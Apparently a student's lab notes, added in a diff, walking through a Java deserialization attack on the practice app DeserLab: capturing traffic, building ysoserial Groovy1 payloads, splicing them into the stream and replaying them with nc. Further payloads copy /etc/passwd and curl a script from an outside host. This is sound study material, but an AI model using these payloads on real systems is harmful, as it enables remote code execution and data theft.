@@ -1,0 +1,199 @@
+Source: 
+http://randomlinuxtech.blogspot.com/2017/08/java-deserialization-howto.html
+
+--------------------------------------------------------------------------
+-- SETUP AND TEST
+--------------------------------------------------------------------------
+
+
+On the client (10.0.1.14):
+--------------------------
+
+Start Wireshark.
+Capture Filter: tcp.port == 12345
+
+On the server (10.0.1.14):
+--------------------------
+scarif:DeserLab-v1.0 pdibona$ java -jar DeserLab.jar -server 10.0.1.14 12345
+[+] DeserServer started, listening on 10.0.1.14:12345
+[+] Connection accepted from 10.0.1.25:50375
+[+] Sending hello...
+[+] Hello sent, waiting for hello from client...
+[+] Hello received from client...
+[+] Sending protocol version...
+[+] Version sent, waiting for version from client...
+[+] Client version is compatible, reading client name...
+[+] Client name received: Skywalker
+[+] Hash request received, hashing: Tatooine is sandy.
+[+] Hash generated: 4195e6d92ce28ab39cc98145cdd32db1
+[+] Done, terminating connection.
+[+] Connection accepted from 10.0.1.14:63649
+[+] Sending hello...
+[+] Hello sent, waiting for hello from client...
+[+] Hello received from client...
+[+] Sending protocol version...
+[+] Version sent, waiting for version from client...
+[+] Client version is compatible, reading client name...
+[+] Client name received: Skywalker
+[+] Hash request received, hashing: Tatooine is sandy.
+[+] Hash generated: 4195e6d92ce28ab39cc98145cdd32db1
+[+] Done, terminating connection.
+
+
+
+
+On the client (10.0.1.25):
+--------------------------
+java -jar DeserLab.jar -client 10.0.1.14 12345
+[+] DeserClient started, connecting to 10.0.1.14:12345
+[+] Connected, reading server hello packet...
+[+] Hello received, sending hello to server...
+[+] Hello sent, reading server protocol version...
+[+] Sending supported protocol version to the server...
+[+] Enter a client name to send to the server: 
+Skywalker
+[+] Enter a string to hash: 
+Tatooine is sandy.
+[+] Generating hash of "Tatooine is sandy."...
+[+] Hash generated: 4195e6d92ce28ab39cc98145cdd32db1
+
+
+On the server (10.0.1.14):
+--------------------------
+Go back to Wireshark.
+Analyze --> Follow --> TCP Stream
+Capture data from client to server in "RAW"
+   - Save as: comms.bin
+   
+   
+
+On the client (10.0.1.14):
+--------------------------
+(SERVER MUST STILL BE RUNNING) -- NC will connect using the captured file!
+(This makes sure that everything works -- no exploit yet)
+
+nc -nv 10.0.1.14 12345 < comms.bin 
+found 0 associations
+found 1 connections:
+     1:	flags=82<CONNECTED,PREFERRED>
+	outif lo0
+	src 10.0.1.14 port 63649
+	dst 10.0.1.14 port 12345
+	rank info not available
+	TCP aux info available
+
+Connection to 10.0.1.14 port 12345 [tcp/*] succeeded!
+??w???wsrnb.deser.HashRequest?,?*???L
+dataToHashtLjava/lang/String;LtheHashq~xptTatooine is sandy.t 4195e6d92ce28ab39cc98145cdd32db1
+
+
+
+
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+-- EXPLOIT
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+
+
+
+
+
+On the server (10.0.1.14):
+--------------------------
+scarif:DeserLab-v1.0 pdibona$ java -jar DeserLab.jar -server 10.0.1.14 12345
+[+] DeserServer started, listening on 10.0.1.14:12345
+
+
+
+On the client (10.0.1.25):
+--------------------------
+
+Start Wireshark.
+Capture Filter: tcp.port == 12345
+
+
+On the client (10.0.1.25):
+--------------------------
+java -jar DeserLab.jar -client 10.0.1.14 12345
+[+] DeserClient started, connecting to 10.0.1.14:12345
+[+] Connected, reading server hello packet...
+[+] Hello received, sending hello to server...
+[+] Hello sent, reading server protocol version...
+[+] Sending supported protocol version to the server...
+[+] Enter a client name to send to the server: 
+test
+[CTRL-C]   (We don't need anything after this)
+
+
+On the client (10.0.1.14):
+--------------------------
+Go back to Wireshark.
+Analyze --> Follow --> TCP Stream
+Capture data from client to server in "RAW"
+   - Save as: payload.bin
+   
+   
+On the client (10.0.1.14):
+--------------------------
+(Build the Exploit)
+scarif:Data pdibona$ java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar Groovy1 "mkdir test-dir" > mkdir.exploit
+
+
+
+On the client (10.0.1.14):
+--------------------------
+Open in a Hex Editor (In INSERT mode):
+  - payload.bin
+  	- Copy everything after 0xACED0005
+  - mkdir.exploit
+    - Paste immediately after 0xACED0005
+    
+  - Save mkdir.exploit as...
+     mkdir.bin
+     
+     
+On the client (10.0.1.14):
+--------------------------
+(SERVER MUST STILL BE RUNNING) -- NC will connect using the captured file!
+(This makes sure that everything works -- no exploit yet)
+
+nc -nv 10.0.1.14 12345 < mkdir.bin 
+     
+     
+On the server (10.0.1.25):
+--------------------------
+You'll see a new 'test-dir' folder!
+
+
+
+
+
+
+
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+-- OTHER EXPLOITS
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+
+
+
+
+
+
+
+java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar Groovy1 "cp /etc/passwd test-dir" > copy.exploit
+
+java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar Groovy1 "/usr/bin/curl -o completely-safe-file.jpg http://s.quickmeme.com/img/6d/6d78dde4cac0310b96938e2ee0696c3ba9410e5de679cbdc1d9967bce8fe4366.jpg"
+
+
+java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar Groovy1 "/usr/bin/curl -o test.sh https://drive.google.com/a/students.rowan.edu/file/d/1XAmI7Xa70-SXX8WwT7DnURZWhdBwEm7a/view?usp=sharing" > downloadscript.exploit
+
+
+git clone https://github.com/pdibona/CS07551.git
+
+
+open -a Preview completely-safe-file.jpg
+
+
